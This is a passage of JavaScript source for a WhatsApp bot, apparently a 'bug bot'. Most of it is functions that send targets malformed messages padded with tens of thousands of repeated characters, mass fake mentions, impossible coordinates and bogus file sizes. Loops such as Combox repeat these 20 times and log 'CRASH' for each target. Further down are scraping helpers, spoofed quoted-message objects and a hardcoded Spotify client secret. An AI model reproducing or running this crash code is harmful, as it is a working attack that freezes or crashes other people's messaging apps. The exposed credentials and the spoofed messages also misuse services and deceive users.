                    name: "⚝𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ⚝",
                    address: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "",
                },
                nativeFlowMessage: {
                  messageParamsJson: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 玄",
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: {
                        title: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟",
                        sections: [
                          {
                            title: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ϟ",
                            rows: [],
                          },
                        ],
                      },
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: {},
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: EsQl,
        }
      );
      await VxoZap.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ XxenTzy ⿻ ▾⭑"));
    }
async function OLDLOC(target, QBug) {
var atc = await generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 \n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb
          },
          hasMediaAttachment: true
        },
        body: {
          text: "ꦾ".repeat(20) + "@1".repeat(50000)
        },
        nativeFlowMessage: {
          messageParamsJson: " ꦾ".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: target, quoted: QBug })
await RyuuBotz.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id })
};
async function BugFrezee(target) {
            RyuuBotz.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 🥶" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0":"🎭𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ⃟⃟⃟⃟⃟꙰꙰꙰꙰꙰꙰꙰꙱҈҈҈҈҈҈҉҉᠁",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(50000),
            url: "@1".repeat(30),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await RyuuBotz.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};
async function DocSystem(target) {
let virtex = "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟";

            RyuuBotz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RyuuBotz || Volgiod" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function DocSystem2(target) {
            RyuuBotz.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "RyuuBotz" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "KILLERBYMOON",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "putzzdragons@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
async function DocSystem3(target) {
            RyuuBotz.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "MOON TECH",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "MOON KILLER",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "RyuuBotz@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
async function FrezeeMsg2(target) {
            let virtex = "⿻🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟⿻";
            let memekz = Date.now();

            await RyuuBotz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "MOON KILLER" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵⿻";

            RyuuBotz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟🇯🇵" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ReinzID Chx CRASH👻👻" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
async function Combox(target) {
for (let i = 0; i < 20; i++) {
await DocSystem(target, Null)
await DocSystem2(target, Null)
await DocSystem3(target, Null)
await BugFrezee(target, Null)
await EncryptMessage(target, Null)
await FrezeeMsg1(target, Null)
await FrezeeMsg2(target, Null)
}
console.log(chalk.red.bold(`ReinzID Chx CRASH👻👻${target}`))
}
async function Combox2(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
console.log(chalk.red.bold(`ReinzID Chx CRASH👻👻${target}`))
}
async function Combox3(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await DocSystem(target)
await DocSystem2(target)
await DocSystem3(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
}
console.log(chalk.red.bold(`ReinzID Chx CRASH👻👻${target}`))
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
RyuuBotz.sendImageAsSticker = async (jid, media, m, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
    let jancok = new Sticker(media, {
        pack: global.packname, // The pack name
        author: global.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['🤩', '🎉'], // The sticker category
        id: '12345', // The sticker id
        quality: 50, // The quality of the output file
        background: '#FFFFFF00' // The sticker background color (only for full stickers)
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await RyuuBotz.sendMessage(jid,{sticker: nah},{quoted: m})
    return await fs.unlinkSync(stok)
     }

const sendvn = (teks) => {
RyuuBotz.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};
async function getCookies() {
    try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/');
        const setCookieHeaders = response.headers['set-cookie'];
        if (setCookieHeaders) {
            const cookies = setCookieHeaders.map(cookieString => {
                const cookieParts = cookieString.split(';');
                const cookieKeyValue = cookieParts[0].trim();
                return cookieKeyValue;
            });
            return cookies.join('; ');
        } else {
            console.warn('No set-cookie headers found in the response.');
            return null;
        }
    } catch (error) {
        console.error('Error fetching cookies:', error);
        return null;
    }
}

async function pinterest(query) {
    try {
        const cookies = await getCookies();
        if (!cookies) {
            console.log('Failed to retrieve cookies. Exiting.');
            return;
        }

        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';

        const params = {
            source_url: `/search/pins/?q=${query}`,
            data: JSON.stringify({
                "options": {
                    "isPrefetch": false,
                    "query": query,
                    "scope": "pins",
                    "no_fetch_context_on_resource": false
                },
                "context": {}
            }),
            _: Date.now()
        };

        const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
        };

        const { data } = await axios.get(url, {
            headers: headers,
            params: params
        })

        const container = [];
        const results = data.resource_response.data.results.filter((v) => v.images?.orig);
        results.forEach((result) => {
            container.push({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id,
            });
        });

        return container;
    } catch (error) {
        console.log(error);
        return [];
    }
}
var ppuser
try {
ppuser = await RyuuBotz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
for (let BhosdikaXeon of ReinzIDVoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./node_modules/Arisu-MD/data/assets/audio/${BhosdikaXeon}.mp3`)
RyuuBotz.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of ReinzIDSticker){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./node_modules/Arisu-MD/data/RyuuMedia/sticker/${BhosdikaXeon}.webp`)
RyuuBotz.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageReinzID){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./node_modules/Arisu-MD/data/RyuuMedia/image/${BhosdikaXeon}.jpg`)
RyuuBotz.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoReinzID){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./node_modules/Arisu-MD/data/RyuuMedia/video/${BhosdikaXeon}.mp4`)
RyuuBotz.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
RyuuBotz.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await RyuuBotz.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}

//////////////
const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }
//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "62xxxxxxxx-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=62xxxxxxxx:62xxxxxxxx\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await RyuuBotz.getName(i),
